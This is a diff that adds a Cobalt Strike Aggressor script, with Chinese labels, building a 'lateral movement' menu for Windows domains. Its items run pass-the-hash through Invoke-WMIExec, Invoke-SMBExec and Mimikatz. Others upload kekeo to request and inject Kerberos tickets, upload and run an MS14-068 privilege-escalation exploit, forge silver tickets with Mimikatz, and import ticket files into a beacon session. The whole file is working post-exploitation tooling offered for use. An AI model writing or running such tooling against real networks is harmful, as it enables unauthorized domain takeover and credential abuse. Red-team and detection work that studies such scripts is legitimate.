@@ -1,4 +1,127 @@
 # 横向移动测试
+
+
 menu "横向移动" {
-	
+	menu "Pass The Hash" {
+		item "Invoke-WMIxec" {
+			$dialog = dialog("WMIexec" , %(bid => $1["@"] , IP => "192.168.1.1" , Domain => "test.com" , command => "whoami" , user => "test" , hash => "xxx" )  ,&Wmiexec);
+			dialog_description($dialog,"使用WMIexex来进行哈希传递");
+			drow_text($dialog, "IP" ,"单个IP:");
+			drow_text($dialog, "Domain" ,"域名:");
+			drow_text($dialog, "user" , "user:");
+			drow_text($dialog, "hash" ,"hash");
+			drow_text($dialog, "command" ,"执行命令:");
+			dbutton_action($dialog,"Exploit");
+			dialog_show($dialog);
+
+
+		}
+		item "Invoke-SMBExec" {
+			$dialog = dialog("WMIexec" , %(bid => $1["@"] , IP => "192.168.1.1" , Domain => "Mikasa.com" , command => "whoami" , user => "administrator" , hash => "xxx" )  ,&SMBexec);
+			dialog_description($dialog,"通过在目标机器上创建服务来执行命令,权限为SYSTEM");
+			drow_text($dialog, "IP" ,"单个IP:");
+			drow_text($dialog, "Domain" ,"域名:");
+			drow_text($dialog, "user" , "user:");
+			drow_text($dialog, "hash" ,"hash");
+			drow_text($dialog, "command" ,"执行命令:");
+			dbutton_action($dialog,"Exploit");
+			dialog_show($dialog);
+
+		}
+		item "Mimikatz-Pth" {
+			$dialog = dialog("Mimikatz-pth" , %(bid => $1["@"] , Domain => "Mikasa.com" , user => "administrator" , hash => "xxx" ) ,lambda({ bpassthehash($3["bid"],$3["Domain"],$3["user"],$3["hash"]); }));
+			dialog_description($dialog,"使用mimikatz进行hash传递,因为Mimikatz的工作机制必须要有本地的管理员权限");
+			drow_text($dialog,"Domain","域名:");
+			drow_text($dialog,"user","用户:");
+			drow_text($dialog,"hash","Hash:");
+			dbutton_action($dialog,"Exploit");
+			dialog_show($dialog);
+		}
+		item "pth_injection_with_Ticket" {
+			$dialog = dialog("pth_Ticket", %(bid => $1["@"] , Domain => "Mikasa.com" , user => "administrator" , Hash => "xxxx") ,&pth_injection_Ticket);
+			dialog_description($dialog,"因为使用Mimikatz传递hash需要管理员权限,所以可以采用票据的形式");
+			drow_text($dialog,"Domain","域名:")
+			drow_text($dialog,"user","用户:");
+			drow_text($dialog,"Hash","Hash:");
+			dbutton_action($dialog,"Exploit");
+			dialog_show($dialog);
+		}
+	}
+	separator();
+	menu "Pass The Ticket" {
+		item "Ms14-068(KB3011780)" {
+			$dialog = dialog("Ms14-068", %(bid => $1["@"] , Domain => "Mikasa.com" , user => "administrator" , password => "123456" , user_sid => "域用户SID" , DC_name => "域控") , &Ms14_068);
+			dialog_descrption($dialog,"微软PAC检验不严格导致的漏洞");
+			drow_text($dialog,"Domain","域名:");
+			drow_text($dialog,"user","用户:");
+			drow_text($dialog,"password","密码:");
+			drow_text($dialog,"user_sid","用户SID:");
+			drow_text($dialog,"DC_name","域控名:");
+			dbutton_action($dialog,"Exploit");
+			dialog_show($dialog);	
+		}
+		separator();
+		item "Silver-ticket" {
+				$dialog = dialog("DomainInfo", %( bid => $1["@"] , Domain => "Mikasa.com" , Domain_sid => "xxx" , Target_name => "WIN-Q1E9PO4969I" , target_hash => "xxx" , user => "administrator" , server => "LDAP" ) ,&Silver_DCSync);
+				dialog_description($dialog,"利用白银票据来获得对某一服务的访问权限");
+				drow_text($dialog,"Domain","域名:");
+				drow_text($dialog,"Domain_sid","域SID:");
+				drow_text($dialog,"Target_name","目标机器名:");
+				drow_text($dialog,"target_hash","目标机器Hash:");
+				drow_text($dialog,"user","用户:");
+				drow_combobox($dialog,"server","服务:",@("LDAP","CIFS","HOST","RPCSS","HTTP"));
+				dbutton_action($dialog,"Exploit");
+				dialog_show($dialog);
+
+		}
+		item "import_ticket" {
+			$dialog = dialog("导如票据文件	于此会话中", %( bid => $1["@"] , file => "") ,lambda({
+				bkerberos_ticket_use($3["bid"],$3["file"])
+			}));
+			dialog_description($dialog,"导入票据文件");
+			drow_file($dialog,"file","票据文件:");
+			dbutton_action($dialog,"Exploit");
+			dialog_show($dialog);
+		}
+	}
 }
+
+sub Wmiexec {
+	bpowershell_import($3["bid"],script_resource("./modules/Invoke-WMIExec.ps1"));
+	$payload = "Invoke-WMIExec -Target " . $3["IP"] . " -Domain " . $3["Domain"] . " -Username " . $3["user"] . " -Hash " . $3["hash"] . " -Command \"" . $3["command"] . "\"" . " -verbose";
+	bpowershell($3["bid"],$payload);
+}
+
+sub SMBexec {
+	bpowershell_import($3["bid"],script_resource("./modules/Invoke-SMBExec.ps1"));
+	$payload = "Invoke-SMBExec -Target " . $3["IP"] . " -Domain " . $3["Domain"] . " -Username " . $3["user"] . " -Hash " . $3["hash"] . " -Command \"" . $3["command"] . "\"" . " -verbose";
+	bpowershell($3["bid"],$payload);
+}
+
+sub pth_injection_Ticket {
+	if ( -is64 $3["bid"] )
+	{
+		bupload($3["bid"], script_resource("./modules/kekeo/x64/kekeo.exe"));
+	}
+	else
+	{
+		bupload($3["bid"], script_resource("./modules/kekeo/Win32/kekeo.exe"));
+	}
+	$payload = "kekeo.exe \"tgt::ask /user:" . $3["user"] . " /domain:" . $3["Domain"] . " /ntlm:" . $3["Hash"] . "\" \"exit\"";
+	$file_name = "TGT_" . $3["user"] . "@" . $3["Domain"] . "_krbtgt~" . $3["Domain"] . "@" . $3["Domain"] . ".kirbi";
+	bshell($3["bid"],$payload)
+	bshell($3["bid"],"kekeo.exe \"kerberos::ptt " . $file_name . "\" \"exit\"");
+}
+
+sub Ms14_068 {
+	bupload($3["bid"],script_resource("./modules/MS14-068.exe"));
+	$payload = "ms14-068.exe -u " . $3["user"] . "@" . $3["Domain"] . " -s " . $3["user_sid"] . " -d " . $3["DC_name"] . "." . $3["Domain"] . " -p " . $3["password"];
+	bshell($3["bid"],$payload);
+	bmimikatz($3["bid"],"kerberos::ptc TGT_" . $3["user"] . "@" . $3["Domain"] . ".ccache");
+}
+
+
+sub Silver_DCSync {
+	$payload = "kerberos::golden /domain:" . $3["Domain"] . " /sid:" . $3["Domain_sid"] . " /target:" . $3["Target_name"] . "." . $3["Domain"] . " /rc4:" . $3["target_hash"] . " /service:" . $3["server"] . " /user:" . $3["user"] . " /ptt";
+	bmimikatz($3["bid"],$payload);
+} 
